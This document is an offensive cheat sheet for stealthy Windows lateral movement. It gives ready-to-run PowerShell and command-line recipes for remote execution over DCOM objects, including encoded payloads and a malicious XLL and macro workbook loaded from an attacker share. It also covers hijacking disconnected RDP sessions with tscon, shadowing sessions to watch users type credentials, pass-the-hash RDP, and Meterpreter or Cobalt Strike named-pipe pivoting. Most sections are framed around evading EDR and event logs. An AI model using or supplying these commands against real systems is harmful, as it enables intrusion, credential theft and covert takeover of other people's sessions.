# DCOM & RDP Session Hijacking — Stealth Lateral Movement

These bypass the most common lateral movement telemetry. PSExec/WinRM create obvious network connections and service installs. DCOM uses built-in Windows COM infrastructure; RDP hijacking uses existing Microsoft tooling.

---

## DCOM Lateral Movement

**Why DCOM:** Legitimate Windows COM traffic. Parent process for execution is `svchost.exe` or `explorer.exe` — not `psexec.exe` or `winrshost.exe`. No new service is created, no named pipe `\PSEXECSVC`, no 445 authentication log in the normal format.

**Requirements:** Local Admin on the target (same as PSExec).

### Method 1: MMC20.Application (Most Common)

The MMC (Microsoft Management Console) Application DCOM object exposes a `Document.ActiveView.ExecuteShellCommand()` method that runs programs remotely.

```powershell
# On your compromised host — create the COM object on the REMOTE machine:
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "192.168.1.50"))

# Execute a command (process spawns as the user running MMC on the remote host):
$com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami > C:\Windows\Temp\out.txt", "7")

# The last arg "7" = SW_SHOWMINNOACTIVE (hidden window)
# "1" = visible, "7" = hidden — always use "7"

# Download and run a payload:
$com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c powershell -enc AABB...==", "7")

# Or run a binary directly:
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\Temp\loader.exe", $null, "", "7")
```

**One-liner:**
```powershell
[System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","192.168.1.50")).Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c powershell -w hidden -enc PAYLOAD","7")
```

---

### Method 2: ShellWindows (Runs as Logged-In User Context)

Uses the `Shell.Application` COM object. Key advantage: **runs in the context of the currently logged-in user** — not a service account. More realistic process tree.

```powershell
# Get a handle to the remote Shell:
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "192.168.1.50"))

# Execute via ShellExecute:
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\Windows\Temp\out.txt", "C:\Windows\System32", $null, 0)

# With a payload:
$item.Document.Application.ShellExecute("powershell.exe", "-w hidden -enc PAYLOAD", "C:\Windows\System32", $null, 0)
```

---

### Method 3: ShellBrowserWindow (IShellDispatch2 — Stealthiest)

Similar to ShellWindows but uses `ShellBrowserWindow` CLSID. Bypasses `WmiPrvSE.exe` parent process monitoring because execution happens inside `explorer.exe`.

```powershell
# Target must have Explorer running (interactive logon required on target)
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.1.50"))

$com.Document.Application.ShellExecute("cmd.exe", "/c C:\Windows\Temp\loader.exe", "C:\Windows\System32", $null, 0)
```

**Parent process:** `explorer.exe` — very normal-looking in EDR telemetry.

---

### Method 4: Excel.Application (DDE-based, requires Office)

Use when Office is installed on the target. Rarely monitored because Excel DCOM is used legitimately.

```powershell
# Requires: Microsoft Office installed on the target
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Excel.Application", "192.168.1.50"))
$com.DisplayAlerts = $false

# Execute via DDEInitiate / Shell:
$com.RegisterXLL("\\192.168.45.202\share\evil.xll")   # XLL add-in execution

# Or use Application.Run with a macro:
$com.Workbooks.Open("\\192.168.45.202\share\macro.xlsm")
$com.Run("Module1.Shell")

# Cleanup:
$com.Quit()
```

---

### DCOM Firewall Requirements

DCOM uses **dynamic RPC ports** (TCP 49152-65535) AND port **135** (RPC endpoint mapper). In most corporate environments these are open between workstations but sometimes blocked.

```powershell
# Test DCOM reachability before attempting:
Test-NetConnection 192.168.1.50 -Port 135
Test-NetConnection 192.168.1.50 -Port 445   # also needed for auth

# If port 135 is closed → DCOM won't work → use WMI or SCShell instead
```

---

## RDP Session Hijacking

**Why:** Instead of spawning a new session (which creates an event log entry), take over an **existing disconnected session**. No new logon event, no new shell process from your tool.

### tscon.exe — Session Takeover (No Password Needed from SYSTEM)

Windows allows `tscon.exe` to connect to any session from **SYSTEM** without credentials.

```cmd
# Step 1: List sessions on the target
query session /server:192.168.1.50
# OR locally:
query session

# Output example:
# SESSIONNAME   USERNAME    ID  STATE    TYPE
# services                  0  Disc
# console       admin       1  Active
# rdp-tcp#2     jdoe        2  Disc      <-- disconnected, takeable
# rdp-tcp#3     itadmin     3  Active

# Step 2: Take over session ID 2 (disconnected) — run as SYSTEM:
tscon 2 /dest:rdp-tcp#0

# From a SYSTEM shell (e.g., after GodPotato/PrintSpoofer):
PsExec.exe -s cmd.exe      # get SYSTEM cmd
tscon 2 /dest:rdp-tcp#0   # steal session — you're now "jdoe"

# Or create a scheduled task to run as SYSTEM:
sc.exe create hijack binpath= "cmd.exe /c tscon 2 /dest:rdp-tcp#0"
sc.exe start hijack
sc.exe delete hijack
```

**Effect:** Your RDP window switches to the stolen user's desktop. Their session is now yours. No new logon event. Their processes, cookies, and mapped drives are already live.

---

### mstsc.exe /shadow — Silent Observer Mode

Lets you **view** an active RDP session without taking it over. Useful for credential harvesting (watch them type).

```cmd
# View session ID 3 (active user) — consent prompt may appear for them:
mstsc.exe /shadow:3

# View without consent prompt (requires policy or admin rights):
mstsc.exe /shadow:3 /noConsentPrompt

# Control the session (interactive, not just view):
mstsc.exe /shadow:3 /control /noConsentPrompt

# Requires the "Remote Desktop Services" shadow group permission or local admin.
# Policy: Computer Config → Windows Settings → Security Settings → Local Policies →
#         User Rights: "Allow log on through Remote Desktop Services"
```

---

### RDP Lateral Movement with Stolen Credentials

```bash
# From Kali — standard RDP:
xfreerdp /v:192.168.1.50 /u:DOMAIN\\user /p:'password' /cert-ignore +clipboard /drive:share,/tmp

# Pass-the-Hash RDP (Restricted Admin mode must be enabled on target):
xfreerdp /v:192.168.1.50 /u:Administrator /pth:NTHASH /cert-ignore

# Enable Restricted Admin on target (run from elevated cmd):
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Run a command on an RDP session via cmd-pass:
xfreerdp /v:192.168.1.50 /u:user /p:pass /cert-ignore /shell:cmd.exe /shell-dir:C:\\Windows\\System32
```

---

## SMB Named Pipe Lateral Movement (Pivoting via C2)

**Why:** When firewall rules block direct connections between workstations, SMB (port 445) is almost always allowed (internal traffic). Route C2 communication through SMB named pipes.

### Meterpreter SMB Listener

```bash
# Kali: set up handler for SMB named pipe
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/bind_named_pipe
set RHOST 192.168.1.50
set PIPENAME svcctl      # blend with legitimate pipe names
run

# On the already-compromised host (pivot point):
# Generate a bind_named_pipe payload:
msfvenom -p windows/x64/meterpreter/bind_named_pipe PIPENAME=svcctl -f exe -o bind_pipe.exe
# Upload and run on the internal target
```

### PSExec over Named Pipe

Standard PSExec already uses named pipes (`\pipe\PSEXECSVC`). For stealthy variants:

```bash
# impacket psexec uses named pipe by default:
impacket-psexec DOMAIN/user:password@TARGET

# Custom pipe name to avoid detection:
impacket-psexec DOMAIN/user:password@TARGET -service-name legit_svc -remote-binary-name legit.exe
```

### Cobalt Strike / Havoc Named Pipe Pivoting

```
# In CS — use SMB Beacon for internal hop:
# Listener: SMB, pipename: \\.\\pipe\\mojo.5688.8052.183894939787788877
# Beacon: link <INTERNAL_TARGET> <PIPENAME>

# Kali-side tunneling example using chisel over SMB:
# Not direct — but Meterpreter can forward:
portfwd add -l 4444 -r INTERNAL_HOST -p 4444
```

---

## Quick-Select Guide

```
Goal                              Method                      Detection Risk
────────────────────────────────────────────────────────────────────────────
Remote cmd, have admin creds      DCOM MMC20.Application      Low
Remote cmd, Explorer running      DCOM ShellBrowserWindow     Very Low
Take over disconnected session    tscon.exe from SYSTEM       Very Low
Watch active session              mstsc /shadow               Low (audit log)
Remote shell, no EDR concern      SCShell or PSExec           High
Remote shell, want stealth        WMIExec                     Medium
Route C2 through SMB              Named Pipe (MSF/CS/Havoc)   Low
```
